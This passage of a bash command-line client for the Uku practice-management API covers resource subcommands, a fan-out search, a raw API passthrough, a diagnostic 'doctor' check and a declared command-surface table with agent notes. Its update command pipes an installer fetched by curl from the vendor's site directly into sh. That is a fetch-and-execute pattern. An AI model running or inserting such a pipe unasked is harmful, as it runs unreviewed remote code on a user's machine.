    get)  [ -n "${2:-}" ] || die "usage: uku tasks get <task_id|title|url>" "$EX_USAGE" @@help.topic tasks; _resolve_ref tasks "$2"; get_resource "/api/v3/tasks/$UKU_REF_ID" ;;
    create) shift || true; parse_list_flags "$@"; write_resource POST /api/v3/tasks "create a task" ;;
    patch)  [ -n "${2:-}" ] || die "usage: uku tasks patch <id|title|url> --data @f  (e.g. status/date)" "$EX_USAGE" @@help.topic tasks; _resolve_ref tasks "$2" write; local id="$UKU_REF_ID"; shift 2; parse_list_flags "$@"; write_resource PATCH "/api/v3/tasks/$id" "update task $id" ;;
    *) die "usage: uku tasks <list|get|create|patch>" "$EX_USAGE" @@help.topic tasks ;;
  esac
}
cmd_time() {
  case "${1:-list}" in
    list) shift || true; parse_list_flags "$@"; list_resource /api/v3/time-entries id task_id duration billable ;;
    get)  [ -n "${2:-}" ] || die "usage: uku time get <id|url>" "$EX_USAGE" @@help.topic time; _resolve_ref time "$2"; get_resource "/api/v3/time-entries/$UKU_REF_ID" ;;
    create) shift || true; parse_list_flags "$@"; write_resource POST /api/v3/time-entries "create a time entry" ;;
    *) die "usage: uku time <list|get|create>  (create needs --data with task_id, person_id, start)" "$EX_USAGE" @@help.topic time ;;
  esac
}
cmd_members()   { case "${1:-list}" in list) shift||true; parse_list_flags "$@"; list_resource /api/v3/members id name role status ;; get) [ -n "${2:-}" ]||die "usage: uku members get <id or name or url>" "$EX_USAGE" @@help.topic members; _resolve_ref members "$2"; get_resource "/api/v3/members/$UKU_REF_ID" ;; *) die "usage: uku members <list|get>" "$EX_USAGE" @@help.topic members ;; esac; }
cmd_products()  { case "${1:-list}" in list) shift||true; parse_list_flags "$@"; list_resource /api/v3/products id name ;; get) [ -n "${2:-}" ]||die "usage: uku products get <id or name or url>" "$EX_USAGE" @@help.topic products; _resolve_ref products "$2"; get_resource "/api/v3/products/$UKU_REF_ID" ;; *) die "usage: uku products <list|get>" "$EX_USAGE" @@help.topic products ;; esac; }
cmd_contracts() { case "${1:-list}" in list) shift||true; parse_list_flags "$@"; list_resource /api/v3/contracts id client_id status ;; get) [ -n "${2:-}" ]||die "usage: uku contracts get <id|url>" "$EX_USAGE" @@help.topic contracts; _resolve_ref contracts "$2"; get_resource "/api/v3/contracts/$UKU_REF_ID" ;; *) die "usage: uku contracts <list|get>" "$EX_USAGE" @@help.topic contracts ;; esac; }
cmd_projects()  { case "${1:-list}" in list) shift||true; parse_list_flags "$@"; list_resource /api/v3/projects id name client_id ;; get) [ -n "${2:-}" ]||die "usage: uku projects get <id or name or url>" "$EX_USAGE" @@help.topic projects; _resolve_ref projects "$2"; get_resource "/api/v3/projects/$UKU_REF_ID" ;; *) die "usage: uku projects <list|get>" "$EX_USAGE" @@help.topic projects ;; esac; }
# `uku me` — the identity behind this key/account (reuses the validated status).
cmd_me() { cmd_auth status "$@"; }
cmd_invoices() {
  case "${1:-list}" in
    list) shift || true; parse_list_flags "$@"; list_resource /api/v3/invoices id invoice_number status client_id ;;
    get)  [ -n "${2:-}" ] || die "usage: uku invoices get <invoice_id|url>" "$EX_USAGE" @@help.topic invoices; _resolve_ref invoices "$2"; get_resource "/api/v3/invoices/$UKU_REF_ID" ;;
    create)
      shift || true; parse_list_flags "$@"
      if [ -n "${UKU_BATCH:-}" ]; then run_batch POST /api/v3/invoices "create invoices"; return; fi
      _reject_client_ref "a write"
      [ -n "${UKU_DATA:-}" ] || die "usage: uku invoices create --data @file.json  (or --data '{...}')" "$EX_USAGE" @@help.topic invoices
      load_creds; need_auth
      local payload; payload="$(read_data "$UKU_DATA")"
      _validate_json "$payload"
      confirm_write "create an invoice"
      do_request POST /api/v3/invoices "$payload"
      check_status "$REPLY_BODY"
      _after_write POST /api/v3/invoices "$REPLY_BODY"
      render "$REPLY_BODY"; info "Invoice created." ;;
    *) die "usage: uku invoices <list|get|create>" "$EX_USAGE" @@help.topic invoices ;;
  esac
}

# ── uku search — ONE query, fanned out ───────────────────────────────
# What this is, exactly, because the difference matters: the Uku API v3 offers
# no global search endpoint that this CLI can verify, and inventing one is how
# a tool starts lying. So `uku search` is the loop a person would otherwise
# type by hand — the SAME `--q` that `uku <res> list --q` has always sent, run
# once against each list endpoint in UKU_SEARCH_RESOURCES (the ones with a name
# field, so a text query means something there). One request per resource, no
# server-side join, no ranking across resources.
#
# A resource that ERRORS is reported as failed. Folding an HTTP 500 into "0
# results" would tell the user their firm has no such client when the truth is
# that nobody looked — the single most dangerous thing a search can do.
cmd_search() {
  local q="" limit=10
  while [ $# -gt 0 ]; do
    case "$1" in
      --limit) _need_val "$@"; limit="$2"; shift 2 ;;
      --*) die "unknown flag for search: $1  (search takes a query and --limit)" "$EX_USAGE" @@help.topic search ;;
      *) [ -z "$q" ] || die "uku search takes ONE query — quote it: uku search 'acme ltd'" "$EX_USAGE" @@help.topic search
         q="$1"; shift ;;
    esac
  done
  [ -n "$q" ] || die "usage: uku search <query> [--limit N]" "$EX_USAGE" @@help.topic search
  load_creds; need_auth

  local res path rc data cnt fld nl
  local json="" first=1 hits=0 failed=0 tty_rows="" bc_res="" bc_id=""
  for res in $UKU_SEARCH_RESOURCES; do
    path="$(_res_path "$res")"; fld="$(_name_field "$res")"
    rc=0
    _UKU_NO_HEAL=1 UKU_SOFT=1 do_request GET "$path$(build_query q="$q" limit="$limit")" || rc=$?
    [ "$first" = "1" ] || json="$json,"; first=0
    if [ "$rc" != "0" ]; then
      failed=$((failed + 1))
      json="$json{\"resource\":$(_json_str "$res"),\"path\":$(_json_str "$path"),\"ok\":false,\"status\":null,\"error\":$(_json_str "could not reach $UKU_BASE"),\"count\":null,\"data\":null}"
      tty_rows="$tty_rows$res	FAILED — could not reach $UKU_BASE"$'\n'
      continue
    fi
    case "$REPLY_STATUS" in
      2*) : ;;
      *)
        failed=$((failed + 1))
        json="$json{\"resource\":$(_json_str "$res"),\"path\":$(_json_str "$path"),\"ok\":false,\"status\":$REPLY_STATUS,\"error\":$(_json_str "HTTP $REPLY_STATUS — $(_body_msg "$REPLY_BODY" | tr '\n' ' ' | cut -c1-120)"),\"count\":null,\"data\":null}"
        tty_rows="$tty_rows$res	FAILED — HTTP $REPLY_STATUS (not searched, NOT zero results)"$'\n'
        continue ;;
    esac
    data="$(printf '%s' "$REPLY_BODY" | _json_scan field data)"
    [ -n "$data" ] || data="[]"
    cnt="$(printf '%s' "$data" | _json_scan len -)"
    case "$cnt" in ''|-1) cnt=0 ;; esac
    hits=$((hits + cnt))
    json="$json{\"resource\":$(_json_str "$res"),\"path\":$(_json_str "$path"),\"ok\":true,\"status\":$REPLY_STATUS,\"error\":null,\"count\":$cnt,\"data\":$data}"
    local names=""
    if have jq && [ "$cnt" -gt 0 ]; then
      names="$(printf '%s' "$REPLY_BODY" | jq -r --arg f "$fld" '.data[]? | "\(.id)  \((.[$f] // "-") | tostring)"' 2>/dev/null | head -n "$limit" || true)"
      [ -z "$bc_id" ] && bc_res="$res" && bc_id="$(printf '%s' "$names" | head -n1 | awk '{print $1}')"
    fi
    tty_rows="$tty_rows$res	$cnt"$'\n'
    if [ -n "$names" ]; then
      while IFS= read -r nl; do [ -n "$nl" ] || continue; tty_rows="$tty_rows 	  $nl"$'\n'; done <<EOF
$names
EOF
    fi
  done
  json="{\"query\":$(_json_str "$q"),\"kind\":\"fanout\",\"resources\":[$json]}"

  local summary="$hits match(es) for '$q' across $(printf '%s' "$UKU_SEARCH_RESOURCES" | wc -w | tr -d '[:space:]') list endpoints"
  [ "$failed" -gt 0 ] && summary="$summary · $failed endpoint(s) FAILED and were not searched"
  if _wants_extras; then
    UKU_SUMMARY="$summary"
    [ -n "$bc_id" ] && _bc_add "@@$bc_res.get" "$bc_id"
  fi
  if [ "${UKU_AGENT:-0}" = "1" ]; then _agent_ok "$json" "$summary"
  elif [ "${UKU_JSON:-0}" = "1" ] || ! _is_tty; then printf '%s\n' "$json"
  else
    printf '  %s %s\n' "$(_bold "search \"$q\"")" \
      "$(_dim '— one --q per list endpoint. Not a server-side search: the API has none.')"
    printf '%s' "$tty_rows" | { have column && column -t -s "$(printf '\t')" || tr '\t' ' '; }
    have jq || warn "install jq to see the matching records, not just the counts."
    [ "$failed" -gt 0 ] && warn "$failed endpoint(s) failed — those are UNSEARCHED, not empty."
    _bc_flush
  fi
  [ "$failed" -gt 0 ] && exit "$EX_API"
  return 0
}

cmd_api() {
  # uku api --describe            → the endpoint catalog (agent self-orientation)
  # uku api METHOD PATH [--data X] [--query k=v]...
  if [ "${1:-}" = "--describe" ]; then _api_describe "${2:-}"; return 0; fi
  local method="${1:-}" path="${2:-}"; shift 2 || true
  [ -n "$method" ] && [ -n "$path" ] || die "usage: uku api <GET|POST|PATCH|DELETE> </api/v3/...> [--data @f] [--query k=v]" "$EX_USAGE" @@help.topic api
  method="$(printf '%s' "$method" | tr '[:lower:]' '[:upper:]')"
  parse_list_flags "$@"
  load_creds; need_auth
  case "$path" in /*) : ;; *) path="/$path" ;; esac
  if [ -n "${UKU_BATCH:-}" ]; then run_batch "$method" "$path" "$method $path"; return; fi
  case "$method" in GET|HEAD) _apply_client_filter "$path" ;; *) _reject_client_ref "a write" ;; esac
  local q; q="$(build_query ${UKU_QUERY[@]+"${UKU_QUERY[@]}"})"
  local payload=""; [ -n "${UKU_DATA:-}" ] && payload="$(read_data "$UKU_DATA")"
  case "$method" in
    GET|HEAD) : ;;
    DELETE) confirm_write "$(_red 'DELETE') $path — this permanently removes it" ;;
    *) [ -n "$payload" ] && _validate_json "$payload"; confirm_write "$method $path" ;;
  esac
  do_request "$method" "$path$q" "$payload"
  check_status "$REPLY_BODY"
  _verify_client_filter "$REPLY_BODY"
  # `uku api` reaches paths this CLI has no command for, so the breadcrumb is
  # only offered when the path IS one of the modelled resources; the summary is
  # always the honest one — the request and what the server answered.
  case "$method" in
    GET|HEAD) if [ -n "$(_path_id "$path")" ]; then _after_get "$path" "$REPLY_BODY"; else _after_list "$path" "$REPLY_BODY"; fi ;;
    *)        _after_write "$method" "$path" "$REPLY_BODY" ;;
  esac
  if _wants_extras; then UKU_SUMMARY="$method $path → HTTP $REPLY_STATUS"; fi
  render "$REPLY_BODY"
}

# _api_describe — a static map of the main v3 resources so an agent can orient
# without fetching docs. The full spec lives at /api/v3/openapi.json.
_api_describe() {
  # optional resource filter: `uku api --describe tasks` prints just its lines
  if [ -n "${1:-}" ]; then
    _api_describe_all | grep -iA1 "^  $1 " || { warn "no '$1' in the map — full map + the spec:"; _api_describe_all; }
    return 0
  fi
  _api_describe_all
}
_api_describe_all() {
  cat <<'MAP'
Uku API v3 — resource map (base: https://app.getuku.com)
  RESOURCE       METHODS   PATH                          POST requires (min)
  clients        GET,POST  /api/v3/clients               name
                 GET,PATCH,DELETE /clients/{id}
  tasks          GET,POST  /api/v3/tasks                 title
                 GET,PATCH,DELETE /tasks/{id}            (status,date,client_id optional)
  time-entries   GET,POST  /api/v3/time-entries          task_id, person_id, start
                 GET,PATCH,DELETE /time-entries/{id}     (end,duration,billable optional)
  invoices       GET,POST  /api/v3/invoices              client_id
                 GET,PATCH /invoices/{id} · POST /{id}/send · /{id}/mark-paid
  members        GET       /api/v3/members
  products       GET,POST  /api/v3/products              name
  contracts      GET,POST  /api/v3/contracts             client_id
  projects       GET,POST  /api/v3/projects              name
  topics         GET,POST  /api/v3/topics · contacts GET,POST /api/v3/contacts
  agreements     GET,POST  /api/v3/agreements · client-groups GET,POST /api/v3/client-groups
Full spec (authoritative for every field): https://app.getuku.com/api/v3/openapi.json
Reach any endpoint: uku api <METHOD> <path> [--data @f] [--query k=v] [--yes]
MAP
}

# _detect_shadow — a `uku` shell function/alias shadows the binary (a subshell
# can't see interactive functions, so grep the rc files). Covers uku(), uku (),
# alias uku=, and zsh's paren-less `function uku { … }` (T13).
_detect_shadow() {
  local rc found=""
  for rc in "$HOME/.zshrc" "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile"; do
    [ -f "$rc" ] || continue
    if grep -Eq '(^|[[:space:]])uku[[:space:]]*(\(\)|=)|(^|[[:space:]])function[[:space:]]+uku([[:space:]]|\{|$)' "$rc" 2>/dev/null; then found="$rc"; break; fi
  done
  printf '%s' "$found"
}

# doctor check accumulators — module-scope so text + --json share one pass.
_DOC_ROWS=""; _DOC_FAILS=0; _DOC_WARNS=0
_doc() { # LEVEL MSG   (ok|warn|fail)
  _DOC_ROWS="$_DOC_ROWS$1|$2"$'\n'
  case "$1" in fail) _DOC_FAILS=$((_DOC_FAILS+1)) ;; warn) _DOC_WARNS=$((_DOC_WARNS+1)) ;; esac
}

# _doctor_json — the report as one object. Shared by --json (which prints it)
# and --agent (which carries it as `data`), so the two can never disagree.
_doctor_json() {
  if have jq; then
    printf '%s' "$_DOC_ROWS" | jq -R -s 'split("\n")|map(select(length>0))|map(split("|")|{level:.[0],message:.[1]})
      | {checks:., fails:(map(select(.level=="fail"))|length), warnings:(map(select(.level=="warn"))|length), ok:(all(.level!="fail"))}'
    return 0
  fi
  # No jq — but --json is a promise ("--json always gives you raw JSON"), and
  # doctor is the command you reach for when the box is BARE. Printing the raw
  # level|message accumulator here emitted something that was not JSON at all,
  # while still exiting 0, so a script parsing it got garbage and no signal that
  # anything was wrong. _json_str already escapes without jq for the batch
  # ledger; the same shape is buildable in pure bash.
  local _dj_first=1 _dj_lvl _dj_msg
  printf '{"checks":['
  while IFS='|' read -r _dj_lvl _dj_msg; do
    [ -z "$_dj_lvl" ] && continue
    [ "$_dj_first" = "1" ] || printf ','
    _dj_first=0
    printf '{"level":%s,"message":%s}' "$(_json_str "$_dj_lvl")" "$(_json_str "$_dj_msg")"
  done <<EOF
$(printf '%s' "$_DOC_ROWS")
EOF
  local _dj_ok=true; [ "$_DOC_FAILS" -gt 0 ] && _dj_ok=false
  printf '],"fails":%d,"warnings":%d,"ok":%s}\n' "$_DOC_FAILS" "$_DOC_WARNS" "$_dj_ok"
  return 0
}

# uku doctor [--json] — one screen that names what's wrong and how to fix it.
# Exits 1 when a REQUIRED check fails (curl missing, credentials rejected);
# offline-safe (the connectivity probe never aborts the report — T3).
cmd_doctor() {
  _DOC_ROWS=""; _DOC_FAILS=0; _DOC_WARNS=0
  local resolved; resolved="$(command -v uku 2>/dev/null || true)"
  [ -n "$resolved" ] && _doc ok "uku on PATH → $resolved" || _doc warn "uku is not on your PATH (installed but PATH not set?)"
  # Version + where updates come from. doctor is the one place that always
  # asks the network, so drift between the shipped constant and the published
  # release pointer shows up here rather than silently. UKU_UPDATE_URL serves
  # main/VERSION, which names the newest *released* tag — not what is on main.
  if have curl; then
    # || true is load-bearing: set -euo pipefail is on, and doctor is
    # documented offline-safe (T3) — a failed probe must never abort the report.
    local remote_v; remote_v="$(curl -fsS --max-time 3 "$UKU_UPDATE_URL" 2>/dev/null | tr -d '[:space:]' || true)"
    if [ -z "$remote_v" ]; then
      _doc warn "version $UKU_VERSION — could not reach the release pointer"
    elif [ "$remote_v" = "$UKU_VERSION" ]; then
      _doc ok "version $UKU_VERSION (latest release)"
    elif _ver_gt "$remote_v" "$UKU_VERSION"; then
      _doc warn "version $UKU_VERSION — $remote_v is available; run 'uku update'"
      _bc_add @@update
    else
      # Ahead of the newest release: a development build, or the rolling
      # channel. Not a fault — auto_update only ever moves forward.
      _doc ok "version $UKU_VERSION (ahead of release $remote_v — development build)"
    fi
  fi
  # The shipped version lives in TWO places: the VERSION file (the release
  # pointer auto_update compares against) and UKU_VERSION in this file.
  #
  # They are NOT required to be equal. VERSION means "the newest release we
  # have published"; UKU_VERSION means "what this file is". On main between
  # releases UKU_VERSION legitimately runs ahead. At a tag they must agree —
  # that is what release.sh guarantees.
  #
  # The fault worth failing on is UKU_VERSION *behind* VERSION: auto_update
  # would then see an update forever and re-install every single day, because
  # the file it installs never reaches the number it is chasing. Only checkouts
  # have a VERSION file next to the binary; an installed single-file uku has none.
  local selfp sd vfile="" fv
  selfp="${BASH_SOURCE[0]:-$0}"
  sd="$(cd "$(dirname "$selfp")" 2>/dev/null && pwd || true)"
  if [ -n "$sd" ]; then
    if [ -f "$sd/VERSION" ]; then vfile="$sd/VERSION"
    elif [ -f "$sd/../VERSION" ]; then vfile="$sd/../VERSION"; fi
  fi
  if [ -n "$vfile" ]; then
    fv="$(tr -d '[:space:]' < "$vfile" 2>/dev/null || true)"
    if [ "$fv" = "$UKU_VERSION" ]; then
      _doc ok "version lock: VERSION and UKU_VERSION agree ($UKU_VERSION) — release-ready"
    elif _ver_gt "$UKU_VERSION" "$fv"; then
      _doc ok "version lock: bin/uku $UKU_VERSION is ahead of release $fv — normal on main; release.sh will align them"
    else
      _doc fail "version lock broken: $vfile says '$fv', bin/uku says '$UKU_VERSION' — the shipped file is BEHIND the release pointer, so every client sees an update that never arrives and re-installs daily. Run scripts/release.sh, or fix UKU_VERSION."
    fi
  fi
  if [ "${UKU_NO_AUTO_UPDATE:-0}" = "1" ]; then
    _doc ok "auto-update off (UKU_NO_AUTO_UPDATE=1)"
  else
    _doc ok "auto-update on — checks once a day, installs the newest released tag (checksum-verified)"
  fi
  local sh; sh="$(_detect_shadow)"
  [ -n "$sh" ] && _doc warn "a shell function/alias 'uku' in $sh shadows this binary — rename it, or call 'command uku'"
  # doctor is the one command whose whole job is "something is wrong" — so each
  # check that CAN be fixed by a command offers that command as a breadcrumb.
  have curl && _doc ok "curl present" || _doc fail "curl missing (required)"
  have jq && _doc ok "jq present" || _doc warn "jq missing — tables + --all degrade to raw JSON (brew install jq)"
  _doc ok "bash $BASH_VERSION"
  if [ -d "$UKU_PROFILE_DIR" ]; then
    local perm; perm="$(ls -ld "$UKU_PROFILE_DIR" 2>/dev/null | cut -c1-10)"
    case "$perm" in drwx------) _doc ok "config dir 0700" ;; *) _doc warn "config dir perms $perm (want 0700): $UKU_PROFILE_DIR" ;; esac
  fi
  load_creds
  if [ -z "${UKU_KEY:-}" ]; then
    _doc warn "no credentials for account '${UKU_PROFILE:-default}' — run: uku auth login"
    _bc_add @@auth.login
  else
    if UKU_SOFT=1 do_request GET /api/v3/members; then
      case "$REPLY_STATUS" in
        2*) _doc ok "signed in · account '$UKU_PROFILE' → $UKU_BASE · key valid" ;;
        401|403) _doc fail "credentials for '$UKU_PROFILE' were rejected (HTTP $REPLY_STATUS) — re-run uku auth login"; _bc_add @@auth.login ;;
        *) _doc warn "unexpected HTTP $REPLY_STATUS from $UKU_BASE" ;;
      esac
    else
      _doc warn "offline — could not reach $UKU_BASE (checked account '$UKU_PROFILE')"
    fi
  fi
  if [ -f "$HOME/.claude/skills/uku/SKILL.md" ]; then _doc ok "Claude Code skill installed"
  else _doc warn "coding-agent skill not installed — run: uku setup agents"; _bc_add @@setup.agents; fi

  if [ "${UKU_AGENT:-0}" = "1" ]; then
    local dsum
    if [ "$_DOC_FAILS" -gt 0 ]; then dsum="$_DOC_FAILS failing, $_DOC_WARNS warning(s)"
    elif [ "$_DOC_WARNS" -gt 0 ]; then dsum="0 failing, $_DOC_WARNS warning(s)"
    else dsum="all checks passed"; fi
    _agent_ok "$(_doctor_json)" "$dsum"
    [ "$_DOC_FAILS" -gt 0 ] && exit 1
    return 0
  fi
  if [ "${UKU_JSON:-0}" = "1" ]; then
    _doctor_json
  else
    # The whole report on STDOUT — heading, every check, the tally. It is this
    # command's output, not commentary on some other output, and it used to be
    # split across both streams, so `uku doctor > report.txt` captured the
    # heading and nothing else. --json was always whole; now text matches it.
    printf '  %s\n\n' "$(_bold 'uku doctor')"
    local line lvl msg
    while IFS='|' read -r lvl msg; do [ -z "$lvl" ] && continue
      case "$lvl" in
        ok)   printf '  %s %s\n' "$(_green '✓')" "$msg" ;;
        warn) printf '  %s %s\n' "$(_color 33 '!')" "$msg" ;;
        fail) printf '  %s %s\n' "$(_red '✗')" "$msg" ;;
      esac
    done <<EOF
$(printf '%s' "$_DOC_ROWS")
EOF
    printf '\n'
    if [ "$_DOC_FAILS" -gt 0 ]; then printf '  %s\n' "$(_red "$_DOC_FAILS failing, $_DOC_WARNS warning(s).")"
    elif [ "$_DOC_WARNS" -gt 0 ]; then printf '  %s\n' "$(_color 33 "$_DOC_WARNS thing(s) to look at.")"
    else printf '  %s %s\n' "$(_green '✓')" "All good."; fi
    _bc_flush
  fi
  [ "$_DOC_FAILS" -gt 0 ] && exit 1 || return 0
}

# uku update — re-run the installer, into THIS binary's directory, no re-prompt.
#
# The installer is always fetched from main (getuku.com/install-cli redirects
# there) — it is the delivery mechanism, not the artefact. What it INSTALLS is
# the release channel's default: the newest published tag, checksum-verified.
# We pass no UKU_VERSION, so the installer resolves the release pointer itself.
#
# UKU_CHANNEL is forwarded when the caller set it, so someone who deliberately
# runs the rolling edge stays there instead of being silently pinned back — but
# they are told, every time, that this update is not verified.
cmd_update() {
  local url="${UKU_INSTALL_URL:-https://getuku.com/install-cli}"
  local self; self="$(command -v uku 2>/dev/null || printf '%s' "$0")"
  local dir; dir="$(cd "$(dirname "$self")" 2>/dev/null && pwd || printf '%s' "$HOME/.local/bin")"
  have curl || die "curl is required to update." "$EX_USAGE"
  local chan="${UKU_CHANNEL:-release}"
  if [ "$chan" = "release" ]; then
    info "Updating uku (current $UKU_VERSION) → newest release, into $dir"
  else
    warn "Updating uku (current $UKU_VERSION) → channel '$chan' (UNVERIFIED — no checksum), into $dir"
  fi
  # pin the install dir to where uku already lives (no second binary, T11) + skip the sign-in re-prompt (N14)
  UKU_BIN_DIR="$dir" UKU_SKIP_SETUP=1 UKU_NO_AUTO_UPDATE=1 UKU_CHANNEL="$chan" curl -fsSL "$url" | sh
}

# ── THE COMMAND SURFACE TABLE ────────────────────────────────────────
# Bash has no command tree to reflect over, so the surface is DECLARED here —
# one row per command — and everything else reads from this one place:
#
#   • `uku --dump-surface` prints it as sorted, one-fact-per-line text, which is
#     committed as `.surface` and diffed by scripts/check-surface.sh. A new
#     fact needs `--update`; a vanished fact is a compatibility break and needs
#     an entry in `.surface-breaking`.
#   • scripts/check-drift.sh checks it BOTH ways: nothing in README.md or the
#     embedded skill may name a command or a flag that is not here, and nothing
#     the dispatcher actually answers to may be missing from here.
#   • `uku help <resource>` and `uku completions` are GENERATED from it, so a
#     row and its help card cannot disagree.
#
# ROW FORMAT — seven `|`-separated columns; everything after the sixth `|`
# belongs to notes, so notes may contain pipes:
#
#   name | cmd-aliases | subcommands | sub-aliases | flags | args | notes
#
#   * `!name` on a subcommand or a flag means MUST BE DOCUMENTED: the literal
#     `uku <cmd> <name>` has to appear in `uku --help`. Use it for surface an
#     agent will otherwise never find.
#   * `@list`, `@data`, `@bulk` expand to the shared flag sets below — the
#     expansion is what lands in `.surface`, so the committed file stays
#     explicit even though the table stays short.
#   * `args` and `notes` hold several entries separated by ` :: `, one fact per
#     entry. `notes` is free text for the agent-facing gotcha — above all the
#     negative kind ("this is NOT a flag here, use X"), which is the knowledge
#     that stops an agent guessing.
#   * a name starting with `%` is a pseudo-row (only `%global`, the flags that
#     work anywhere) — not a command, never dispatched, never probed.
_surface_table() {
  cat <<'TABLE'
# name    | cmd-aliases  | subcommands             | sub-aliases    | flags                                                   | args                                            | notes
auth        |              | login status logout print-header | print-headers | --account --company --base --key-stdin --format --shell |                                                 | `print-header` prints a LIVE credential on stdout — never echo it back, never commit it; prefer `uku api` :: `--base` on `auth login` beats UKU_BASE_URL and the key is validated against THAT base before anything is stored :: `--shell` is shorthand for `--format shell`
account     | accounts     | list add use current remove | ls switch who rm | --company --key-stdin                               | use <name> :: add <name> :: remove <name>       | `--account <name>` is a GLOBAL flag, NOT a subcommand here: `uku --account main tasks list` :: `add` is sugar for `uku auth login --account <name>` :: run `uku account current` before any write — a sandbox and the real firm look identical in the output
setup       | setup-agents | agents                  |                |                                                         |                                                 | UKU_SETUP_AGENT=claude|cursor|codex|all|none picks the target; the default `auto` detects what is installed
clients     | client       | list get !create !patch |                | @list @data @bulk                                       | get <client_id> :: patch <client_id> :: get/patch also take a client NAME or a pasted URL | a write needs --yes when stdout is not a TTY (exit 4 otherwise) :: --batch belongs to `create`; `uku clients list --batch` is a usage error, not a bulk read :: `get`/`patch` also take a NAME or a pasted URL — see the `--client` note on `tasks` :: on `patch`, an id-shaped argument costs one extra GET: it is checked against client NAMES too, because `12345678` and `CAFE-1` are both — `--by-id` skips the check :: `--client` is not a filter here (you are already listing clients) — use `--q`
tasks       | task         | list get !create !patch |                | @list --client @data @bulk                              | get <task_id> :: patch <task_id> :: get/patch also take a task TITLE or a pasted URL | `create` needs `title`; status/date/client_id are optional :: a 428 on `POST /api/v3/tasks` is NOT healed — it is a collection POST with no id to read an ETag from :: an argument that is not id-shaped is resolved by NAME through the same `--q` a list takes: one match is used and named on stderr, several REFUSE and list the candidates :: `--client NAME|ID` resolves the name once and sends `client_id=<id>` — the same query pair you would type by hand :: that the endpoint HONOURS client_id is the one thing here that could not be verified offline, so it is MEASURED: any returned row whose client_id differs from the one asked for means the filter was not applied, and the command fails with exit 3 instead of handing back an unfiltered list. A row with no client_id (or a null one) proves nothing and never trips it, and `--client` refuses up front without jq because that comparison is what it needs :: NAME resolution never happens in a `--batch`, and never for an argument that already looks like an id — but on a WRITE an id-shaped argument is still PROBED for a record whose name is that exact string (one extra GET), and a collision is refused until `--by-id` or `--by-name` says which was meant; on a read the id-shaped argument passes straight through with no request :: a name lookup reads at most 100 records and compares `meta.total` against them: when more could exist than were examined it refuses, because a match it cannot see the alternatives to is not a unique one
time        |              | list get !create        |                | @list --client @data @bulk                              | get <id> :: get also takes a pasted URL (no name field here) | there is NO `uku time patch` — use `uku api PATCH /api/v3/time-entries/<id>` :: `create` needs task_id, person_id and start :: `start` with no `end` is a RUNNING TIMER, not logged work — the CLI refuses duration-without-end before sending :: a time entry has no name, so `get` takes an id or a pasted URL — never a name
invoices    | invoice      | list get !create        |                | @list --client @data @bulk                              | get <invoice_id> :: get also takes a pasted URL (no name field here) | money needs an All-scope key — a `403 … scope` is the system working as designed, do not retry around it :: there is no `uku invoices patch`; use `uku api PATCH /api/v3/invoices/<id>` :: there is no `uku invoices send` and no `uku invoices mark-paid` either — the API has both as POSTs, so use `uku api POST /api/v3/invoices/<id>/send --yes` and `uku api POST /api/v3/invoices/<id>/mark-paid --yes`. Do not guess a subcommand for a money action :: an invoice has no name field, so `get` takes an id or a pasted URL — never a name
members     | member       | list get                |                | @list                                                   | get <id> :: get also takes a member NAME or a pasted URL | read-only in the CLI — member writes go through `uku api` :: `get` also takes a member NAME (resolved through `--q`) or a pasted URL
products    | product      | list get                |                | @list                                                   | get <id> :: get also takes a product NAME or a pasted URL | read-only in the CLI; the API does accept `POST /api/v3/products` (needs `name`) — reach it with `uku api` :: `get` also takes a product NAME or a pasted URL
contracts   | contract     | list get                |                | @list --client                                          | get <id> :: get also takes a pasted URL (no name field here) | read-only in the CLI; contract rows are ETag-guarded — see `uku help api` and the 428 rules :: a contract has no name field, so `get` takes an id or a pasted URL — never a name
projects    | project      | list get                |                | @list --client                                          | get <id> :: get also takes a project NAME or a pasted URL | read-only in the CLI; the API does accept `POST /api/v3/projects` (needs `name`) — reach it with `uku api` :: `get` also takes a project NAME or a pasted URL
me          |              |                         |                |                                                         |                                                 | prints exactly what `uku auth status` prints — the identity behind the active key
search      |              |                         |                | --limit                                                 | <query>                                         | NOT a server-side global search — the API offers none this CLI can verify. It is ONE `--q` fanned out over the list endpoints that have a name field (clients, tasks, members, products, projects), one request each :: a resource that errors is reported as FAILED, never folded into "0 results" — exit 3 when any did :: `--limit` is per endpoint
api         |              |                         |                | !--describe @list --client @data @bulk                  | <METHOD> :: </api/v3/...>                       | METHOD and PATH are POSITIONAL, not flags: `uku api GET /api/v3/tasks` :: `uku api --describe [resource]` prints the resource map — the fastest way for an agent to orient :: this reaches every v3 endpoint, so prefer it over dropping to curl :: `--client NAME` works on a GET whose path is one of the collections that carry a client_id; on a write it is a usage error
batch       |              | list show               | ls             |                                                         | show <run-id>                                   | reads the LOCAL ledger under $UKU_CONFIG_HOME/batches and sends no request :: `uku batch` is not how you run a batch — that is `uku <res> create --batch @f.jsonl`
doctor      |              |                         |                |                                                         |                                                 | `--json` (the global flag) gives the whole report as JSON :: exits 1 only when a REQUIRED check fails, never for a warning
update      |              |                         |                |                                                         |                                                 | re-runs the installer for the newest RELEASE tag, checksum-verified; UKU_CHANNEL=main opts into the unverified rolling edge
completions |              | bash zsh                |                |                                                         | <shell>                                         | eval "$(uku completions zsh)" in your rc
version     |              |                         |                |                                                         |                                                 | identical to `uku --version`
help        |              | auth account setup clients tasks time invoices members products contracts projects batch api search names | | |  <command>                                   | `uku <command> --help` prints the same card :: a topic with no card is a usage error, not an empty page
%global     |              |                         |                | --json !--agent --no-hints --yes -y --dry-run --quiet -q --no-color --fields !--by-id !--by-name --account --base --header -H --if-match --all --help -h --version -V --dump-surface --dump-remedies | | these are parsed ANYWHERE on the line, before the command :: `--dump-surface` prints this table one fact per line — it is the build gate's hook, not a user feature :: `--agent` wraps the response in {ok,data,meta,summary,breadcrumbs} — EXCEPT a `--batch` run, which stays JSONL one object per input line under `--agent`, and whose failures are those lines, so a failed run exits 3 with no {"ok":false} envelope at all; `--json` stays the RAW API body, except that `--fields` projects each row and re-serialises it through jq :: `--json` and `--agent` are alternatives — passing both is a usage error :: `uku <command> --help --agent` emits this table as JSON, including these notes :: `--no-hints` drops the breadcrumb footer (so do `--quiet` and `--json`) :: `--by-id` / `--by-name` say how to read an argument that could be either; on a WRITE an id-shaped argument that is ALSO an exact name is refused until you say which
TABLE
}

# shared flag sets — expanded into the committed surface, so `.surface` stays
# explicit while the table stays readable.
_surface_expand() { # FLAGS… → the same list with @groups expanded
  local t out=""
  for t in $1; do
    case "$t" in
      @list) out="$out --limit --offset --q --search --status --sort --query --cursor --all" ;;
      @data) out="$out --data -d" ;;
